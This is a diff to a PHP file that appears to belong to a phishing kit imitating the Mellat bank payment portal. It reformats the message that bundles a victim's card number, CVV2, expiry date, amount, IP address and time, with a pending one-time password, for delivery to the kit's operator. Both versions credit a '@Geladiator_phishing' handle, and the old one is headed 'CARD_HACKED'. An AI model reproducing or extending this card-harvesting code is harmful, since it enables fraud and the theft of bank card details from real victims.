@@ -134,24 +134,24 @@ else{
 $ip = $_SERVER["REMOTE_ADDR"];
 
 $Text = "
-#ＣＡＲＤ_ＨＡＣＫＥＤ
-
-🏦вǞПκ: $bankname
-🔥𝙲𝙰𝚁𝙳: <code>$pan</code>
-🌩𝙾𝚃𝙿 : Waiting.... 
-🔱𝙲𝚟𝚟𝟤: <code>$cvv</code>
-🔱𝚢𝚎𝚊𝚛: <code>$year</code> Month: <code>$month</code>
-🌐𝙸𝙿: <code>$ip</code>
-⏰𝚃𝙸𝙼𝙴: $saat
-📝𝚃𝙾𝙳𝙰𝚈: $roz
-📌𝙳𝙰𝚃𝙴: $tarikh
-💴𝙰𝙼𝙾𝚄𝙽𝚃 : $amount 𝗥𝗶𝗮𝗹𝘀
-✨ 𝙿𝙾𝚁𝚃𝙰𝙻 : 𝙼𝙴𝙻𝙻𝙰𝚃
-   
-   ƇODƐD ßY @Geladiator_phishing
-
-    @phishing_bax
-#ＩＮＦＯ_ＣＡＲＤ
+✅ Transaction finished!
+-------------- BANK --------------
+🏦 Name : $bankinfo[1]
+-------------- CARD --------------
+💳 Card : <code>$pan</code>
+⏱ OTP : Waiting....
+📋 Cvv2 : <code>$cvv</code>
+📆 Date : <code>$year</code> Month: <code>$month</code>
+-------------- INFO --------------
+💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
+📍 IP : <code>$ip</code>
+⏰ Time : $saat
+📝 ToDay : $roz
+📌 Date : $tarikh
+✨ Portal : Mellat
+------------- Creator -------------
+🆔 : @Geladiator_phishing :)
+🌐 Webhost : @XTuranli :)
 ";
 $T="000";
 $I= 0000;
